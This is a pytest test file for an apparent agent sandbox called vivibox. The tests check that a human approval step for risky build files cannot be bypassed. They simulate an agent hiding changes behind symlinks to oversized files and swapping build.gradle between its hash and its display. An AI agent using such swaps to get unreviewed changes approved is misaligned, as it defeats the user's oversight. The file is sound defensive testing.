def approved_gradle(task) -> Path:
    (task.repo / "build.gradle").write_text("plugins {}\n")
    Approvals(task.meta, task.repo).approve()
    return task.repo / "build.gradle"


def test_a_risky_link_to_a_large_file_in_the_repository_is_held_like_that_file(task, monkeypatch):
    from vivibox import actions

    gradle = approved_gradle(task)
    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 100 << 20)  # its hash fits, a copy does not
    with open(sparse(task.repo / "data" / "blob.txt", 70 << 20), "r+b") as file:
        file.write(b"plugins { id 'evil' }\n")
    gradle.unlink()
    gradle.symlink_to("data/blob.txt")
    said = "\n".join(actions.risky_diffs(task, P))
    assert "could not copy it for you to read: scan budget exceeded" in said
    before = Approvals(task.meta, task.repo).approved()
    with pytest.raises(risky.Unapprovable, match="build.gradle"):
        actions.approve_risky(task, P)
    assert Approvals(task.meta, task.repo).approved() == before


def test_a_risky_link_to_a_small_file_in_the_repository_shows_what_it_points_to(task):
    from vivibox import actions

    gradle = approved_gradle(task)
    (task.repo / "data").mkdir()
    (task.repo / "data" / "real.txt").write_text("plugins { id 'java' }\n")
    gradle.unlink()
    gradle.symlink_to("data/real.txt")
    said = actions.risky_diffs(task, P)[0]
    assert "symlink to data/real.txt" in said and "+plugins { id 'java' }" in said
    assert actions.approve_risky(task, P)[0] == 1


@pytest.mark.parametrize("swap", ["a FIFO", "a link", "binary", "another large file"])
def test_a_file_swapped_after_p_hashed_it_is_not_approved_unseen(task, monkeypatch, swap):
    """The agent swaps the file between p's hash and p's showing it, then puts it back: what p
    would record is what it hashed, which it never showed you."""
    from vivibox import actions

    gradle = approved_gradle(task)
    with open(sparse(gradle, 70 << 20), "r+b") as file:
        file.write(b"plugins { id 'evil' }\n")
    (task.repo / "data").mkdir()
    (task.repo / "data" / "small.txt").write_text("plugins {}\n")
    hidden, real_scan = task.root / "hidden", risky.scan

    def scan_then_swap(*args, **kwargs):
        now = real_scan(*args, **kwargs)
        if not hidden.exists():
            gradle.rename(hidden)  # after its hash closed the file
            if swap == "a FIFO":
                os.mkfifo(gradle)
            elif swap == "a link":
                gradle.symlink_to("data/small.txt")
            elif swap == "another large file":  # copied for you whole, but not what was hashed
                with open(sparse(gradle, 70 << 20), "r+b") as file:
                    file.write(b"plugins { id 'other' }\n")
            else:
                gradle.write_bytes(b"\xff\xfe\x00 not text\n")
        return now

    before = Approvals(task.meta, task.repo).approved()
    monkeypatch.setattr(risky, "scan", scan_then_swap)
    with pytest.raises(risky.Unapprovable, match="build.gradle"):
        actions.approve_risky(task, P)
    monkeypatch.setattr(risky, "scan", real_scan)
    gradle.unlink()
    hidden.rename(gradle)  # back as it was
    approvals = Approvals(task.meta, task.repo)
    assert approvals.approved() == before
    assert approvals.changes() == [Change("build.gradle", "changed")]


def test_the_first_approval_takes_your_repository_as_it_is(tmp_path, monkeypatch):
    """No approval yet: the task's start, your repository, which nothing holds to being shown."""
    monkeypatch.setenv("VIVIBOX_CONFIG_DIR", str(tmp_path / "config"))  # never your projects
    source = make_repo(tmp_path / "source")
    t = create_task(tmp_path / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
    names = five_of_a_mib(t.repo, monkeypatch)
    approvals = Approvals(t.meta, t.repo)
    assert approvals.approve_changes() == [Change(n, "added") for n in names]
    assert sorted(approvals.approved()) == names
